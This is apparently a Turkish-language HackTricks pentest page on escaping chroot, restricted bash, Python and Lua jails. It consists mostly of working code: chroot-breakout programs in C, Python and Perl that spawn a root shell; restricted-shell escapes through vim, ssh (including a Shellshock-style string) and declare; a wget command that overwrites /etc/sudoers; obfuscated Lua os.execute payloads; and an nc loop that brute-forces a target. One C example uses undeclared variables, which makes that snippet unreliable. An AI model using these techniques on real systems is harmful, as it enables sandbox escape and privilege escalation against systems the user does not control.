# Jailer'dan Kaçış

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**"Shell" özelliğine sahip herhangi bir ikili dosyayı çalıştırıp çalıştıramayacağınızı** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **adresinde arayın**

## Chroot Kaçışları

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)'dan: Chroot mekanizması **yetkili** (**root**) **kullanıcılar** tarafından kasıtlı müdahalelere karşı **savunma yapmak için** tasarlanmamıştır. Çoğu sistemde, chroot bağlamları düzgün bir şekilde yığılmamaktadır ve yeterli ayrıcalıklara sahip chroot edilmiş programlar **çıkmak için ikinci bir chroot gerçekleştirebilir**.\
Genellikle bu, kaçış yapmak için chroot içinde root olmanız gerektiği anlamına gelir.

> [!TIP]
> **chw00t** [**aracı**](https://github.com/earthquake/chw00t), aşağıdaki senaryoları kötüye kullanmak ve `chroot`'tan kaçmak için oluşturulmuştur.

### Root + CWD

> [!WARNING]
> Eğer bir chroot içinde **root** iseniz, **başka bir chroot** oluşturarak **kaçabilirsiniz**. Bunun nedeni, 2 chroot'un (Linux'ta) bir arada var olamayacağıdır, bu nedenle bir klasör oluşturup ardından **o yeni klasörde yeni bir chroot oluşturursanız** ve **dışında olursanız**, artık **yeni chroot'un dışındasınız** ve dolayısıyla FS'de olacaksınız.
>
> Bu, genellikle chroot'un çalışma dizininizi belirtilen yere taşımadığı için olur, bu nedenle bir chroot oluşturabilirsiniz ama onun dışında olursunuz.

Genellikle bir chroot hapishanesinde `chroot` ikili dosyasını bulamazsınız, ancak bir ikili dosyayı **derleyebilir, yükleyebilir ve çalıştırabilirsiniz**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Kaydedilmiş fd

> [!WARNING]
> Bu, önceki duruma benzer, ancak bu durumda **saldırgan mevcut dizine bir dosya tanımlayıcısı kaydeder** ve ardından **yeni bir klasörde chroot oluşturur**. Son olarak, chroot'un **dışında** o **FD'ye** **erişimi** olduğundan, ona erişir ve **kaçış** yapar.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD, Unix Domain Sockets üzerinden geçirilebilir, bu yüzden:
>
> - Bir çocuk işlem oluştur (fork)
> - Ebeveyn ve çocuk arasında iletişim kurmak için UDS oluştur
> - Çocuk işlemde farklı bir klasörde chroot çalıştır
> - Ebeveyn işlemde, yeni çocuk işlem chroot'unun dışında bir klasörün FD'sini oluştur
> - Bu FD'yi UDS kullanarak çocuk işleme geçir
> - Çocuk işlem bu FD'ye chdir yapar ve çünkü chroot'unun dışındadır, hapisten kaçar

### Root + Mount

> [!WARNING]
>
> - Kök cihazı (/) chroot'un içindeki bir dizine monte et
> - O dizine chroot yap
>
> Bu Linux'ta mümkündür

### Root + /proc

> [!WARNING]
>
> - procfs'i chroot'un içindeki bir dizine monte et (henüz değilse)
> - Farklı bir root/cwd girişi olan bir pid ara, örneğin: /proc/1/root
> - O girişe chroot yap

### Root(?) + Fork

> [!WARNING]
>
> - Bir Fork (çocuk işlem) oluştur ve FS'de daha derin bir klasöre chroot yap ve oraya CD yap
> - Ebeveyn işlemden, çocuk işlemin bulunduğu klasörü çocukların chroot'unun öncesindeki bir klasöre taşı
> - Bu çocuk işlem kendini chroot'un dışında bulacaktır

### ptrace

> [!WARNING]
>
> - Bir zamanlar kullanıcılar kendi işlemlerini kendi süreçlerinden hata ayıklayabiliyordu... ama bu artık varsayılan olarak mümkün değil
> - Yine de, mümkünse, bir işleme ptrace yapabilir ve içinde bir shellcode çalıştırabilirsin ([bu örneğe bak](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Hapishane hakkında bilgi al:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### PATH'i Değiştir

PATH ortam değişkenini değiştirebilir misiniz kontrol edin
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim Kullanımı
```bash
:set shell=/bin/sh
:shell
```
### Script oluştur

_/bin/bash_ içeriği ile çalıştırılabilir bir dosya oluşturup oluşturamayacağınızı kontrol edin.
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH ile bash alın

Eğer ssh üzerinden erişiyorsanız, bir bash shell'i çalıştırmak için bu hileyi kullanabilirsiniz:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Beyan Et
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Örneğin sudoers dosyasını üzerine yazabilirsiniz.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Diğer hileler

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Ayrıca şu sayfa ilginç olabilir:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Python hapishanelerinden kaçış hakkında hileler aşağıdaki sayfada:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Bu sayfada lua içinde erişebileceğiniz global fonksiyonları bulabilirsiniz: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Komut yürütme ile Eval:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Bir kütüphanenin **nokta kullanmadan fonksiyonlarını çağırmak için bazı ipuçları**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Bir kütüphanenin fonksiyonlarını listele:
```bash
for k,v in pairs(string) do print(k,v) end
```
Not edin ki, önceki tek satırı **farklı bir lua ortamında her çalıştırdığınızda fonksiyonların sırası değişir**. Bu nedenle, belirli bir fonksiyonu çalıştırmanız gerekiyorsa, farklı lua ortamlarını yükleyerek ve le library'nin ilk fonksiyonunu çağırarak bir brute force saldırısı gerçekleştirebilirsiniz:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Etkileşimli lua shell alın**: Eğer sınırlı bir lua shell içindeyseniz, yeni bir lua shell (ve umarım sınırsız) almak için şunu çağırabilirsiniz:
```bash
debug.debug()
```
## Referanslar

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slaytlar: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))

{{#include ../../banners/hacktricks-training.md}}
